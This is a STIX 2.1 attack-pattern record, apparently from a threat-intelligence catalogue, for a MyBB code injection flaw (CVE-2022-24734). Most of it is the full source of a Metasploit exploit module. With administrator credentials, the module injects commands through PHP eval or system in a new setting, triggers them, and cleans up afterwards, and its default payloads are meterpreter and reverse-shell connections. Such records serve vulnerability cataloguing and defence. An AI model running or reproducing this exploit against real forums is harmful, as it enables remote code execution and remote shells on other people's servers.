{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8dbccef-d265-4a13-8b1d-7961c58d38e5",
    "created": "2024-08-14T17:09:46.863755Z",
    "modified": "2024-08-14T17:09:46.863759Z",
    "name": "MyBB Admin Control Code Injection RCE",
    "description": " This exploit module leverages an improper input validation vulnerability in MyBB prior to `1.8.30` to execute arbitrary code in the context of the user running the application.  MyBB Admin Control setting page calls PHP `eval` function with an unsanitized user input. The exploit adds a new setting, injecting the payload in the vulnerable field, and triggers its execution with a second request. Finally, it takes care of cleaning up and removes the setting.  Note that authentication is required for this exploit to work and the account must have rights to add or update settings (typically, myBB administrator role).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mybb_rce_cve_2022_24734.rb",
            "external_id": "mybb_rce_cve_2022_24734.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mybb/mybb/security/advisories/GHSA-876v-gwgh-w57f"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-22-503/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Altelus1/CVE-2022-24734"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24734"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MyBB Admin Control Code Injection RCE',\n        'Description' => %q{\n          This exploit module leverages an improper input validation\n          vulnerability in MyBB prior to `1.8.30` to execute arbitrary code in\n          the context of the user running the application.\n\n          MyBB Admin Control setting page calls PHP `eval` function with an\n          unsanitized user input. The exploit adds a new setting, injecting the\n          payload in the vulnerable field, and triggers its execution with a\n          second request. Finally, it takes care of cleaning up and removes the\n          setting.\n\n          Note that authentication is required for this exploit to work and the\n          account must have rights to add or update settings (typically, myBB\n          administrator role).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Cillian Collins', # vulnerability research\n          'Altelus', # original PoC\n          'Christophe De La Fuente' # MSF module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/mybb/mybb/security/advisories/GHSA-876v-gwgh-w57f'],\n          [ 'URL', 'https://www.zerodayinitiative.com/advisories/ZDI-22-503/'],\n          [ 'URL', 'https://github.com/Altelus1/CVE-2022-24734'],\n          [ 'CVE', '2022-24734']\n        ],\n        'Platform' => %w[php unix linux win],\n        'Privileged' => false,\n        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' },\n              'Type' => :in_memory\n            }\n          ],\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_php_ssl' },\n              'Type' => :in_memory\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :dropper\n            }\n          ],\n          [\n            'Windows (In-Memory)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp' },\n              'Type' => :in_memory\n            }\n          ],\n          [\n            'Windows (Dropper)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },\n              'Type' => :dropper\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-03-09',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'MyBB Admin CP username' ]),\n        OptString.new('PASSWORD', [ true, 'MyBB Admin CP password' ]),\n        OptString.new('TARGETURI', [ true, 'The URI of the MyBB application', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET',\n      'vars_get' => { 'intcheck' => 1 }\n    })\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    # see https://github.com/mybb/mybb/blob/feature/inc/class_core.php#L307-L310\n    unless res.body.include?('&#077;&#089;&#066;&#066;')\n      return CheckCode::Unknown(\"#{peer} - Cannot find MyBB forum running at #{target_uri.path}\")\n    end\n\n    print_good(\"MyBB forum found running at #{target_uri.path}\")\n\n    return CheckCode::Detected\n  end\n\n  def login\n    vprint_status('Attempting login')\n\n    cookie_jar.cleanup(true)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/admin/index.php'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'do' => 'login'\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    unless res.body.match(/Logged in as .*#{datastore['USERNAME']}/)\n      fail_with(Failure::NoAccess, \"#{peer} - Invalid credentials\")\n    end\n\n    print_good('Login successful!')\n  end\n\n  def send_config_settings(method: 'GET', action: 'add', vars_get: {}, vars_post: {}, check_response: true)\n    req_hash = {\n      'uri' => normalize_uri(target_uri.path, '/admin/index.php'),\n      'method' => method,\n      'vars_get' => {\n        'module' => 'config-settings',\n        'action' => action\n      }.merge(vars_get)\n    }\n    req_hash['vars_post'] = vars_post unless vars_post.blank?\n    res = send_request_cgi(req_hash, datastore['WfsDelay'] > 0 ? datastore['WfsDelay'] : 2)\n    if check_response && res.nil?\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\")\n    end\n    res\n  end\n\n  def exploit\n    login\n\n    res = send_config_settings\n    if res.body.include?('Access Denied')\n      fail_with(Failure::NoAccess, \"#{peer} - Supplied user doesn't have the rights to add a setting\")\n    end\n\n    vprint_status('Adding a malicious settings')\n    doc = res.get_html_document\n    @my_post_key = doc.xpath('//input[@name=\"my_post_key\"]/@value').text\n\n    case target['Type']\n    when :in_memory\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\n\n  def send_payload(cmd)\n    vprint_status('Adding a crafted configuration setting entry with the payload')\n\n    cmd = cmd.gsub(/\\\\/, '\\\\' => '\\\\\\\\')\n    cmd = cmd.gsub(/\"/, '\"' => '\\\\\"')\n    cmd = cmd.gsub(/\\$/, '$' => '\\\\$')\n\n    case target['Platform']\n    when 'php'\n      extra = \"\\\" . eval(\\\"#{cmd}\\\") .\\\"\"\n    when 'win'\n      if target['Arch'] == ARCH_CMD\n        # Force cmd to run in the background (only works for `cmd`)\n        extra = \"\\\" . pclose(popen(\\\"start /B #{cmd}\\\", \\\"r\\\")) .\\\"\"\n      else\n        extra = \"\\\" . system(\\\"#{cmd}\\\") .\\\"\"\n      end\n    else\n      extra = \"\\\" . system(\\\"#{cmd} > /dev/null &\\\") .\\\"\"\n    end\n\n    post_data = {\n      my_post_key: @my_post_key,\n      title: Rex::Text.rand_text_alpha(rand(8...16)),\n      description: Rex::Text.rand_text_alpha(rand(8...16)),\n      gid: 1,\n      disporder: '',\n      name: Rex::Text.rand_text_alpha(rand(8...16)),\n      type: \"\\tphp\",\n      extra: extra,\n      value: Rex::Text.rand_text_alpha(rand(8...16))\n    }\n\n    res = send_config_settings(method: 'POST', vars_post: post_data)\n    unless res.code == 302\n      doc = res.get_html_document\n      err = doc.xpath('//div[@class=\"error\"]').text\n      fail_with(Failure::Unknown,\n                \"#{peer} - The module expected a 302 response but received: \"\\\n                \"#{res.code}. Exploit didn't work.#{\" Reason: #{err}\" if err.present?}\")\n    end\n\n    vprint_good('Payload successfully sent')\n  end\n\n  def trigger_payload\n    vprint_status('Triggering the payload execution')\n    # We're not expecting response to this query\n    send_config_settings(action: 'change', check_response: false)\n  end\n\n  def remove_setting\n    vprint_status('Removing the configuration setting')\n\n    vprint_status('Grab the delete parameters')\n    res = send_config_settings(action: 'manage')\n    if res.body.include?('<title>MyBB Control Panel - Login</title>')\n      # this exploit seems to logout users sometimes, so, try to login again and retry\n      print_status('User session is not valid anymore. Trying to login again to cleanup')\n      login\n      res = send_config_settings(action: 'manage')\n    end\n\n    doc = res.get_html_document\n    control_links = doc.xpath('//div[@class=\"popup_item_container\"]/a/@href')\n    uri = control_links.detect do |href|\n      href.text.include?('action=delete') && href.text.include?(\"my_post_key=#{@my_post_key}\")\n    end\n    if uri.nil?\n      print_warning(\"#{peer} - URI not found in `Modify Settings` page - cannot cleanup\")\n      return\n    end\n\n    vprint_status('Send the delete request')\n    params = uri.text.split('?')[1]\n    get_data = CGI.parse(params).transform_values(&:join)\n    send_config_settings(method: 'POST', vars_get: get_data)\n  end\n\n  def execute_command(cmd, _opt = {})\n    send_payload(cmd)\n    trigger_payload\n    remove_setting\n    print_status('Shell incoming...')\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-09",
    "x_mitre_platforms": [
        "win'"
    ]
}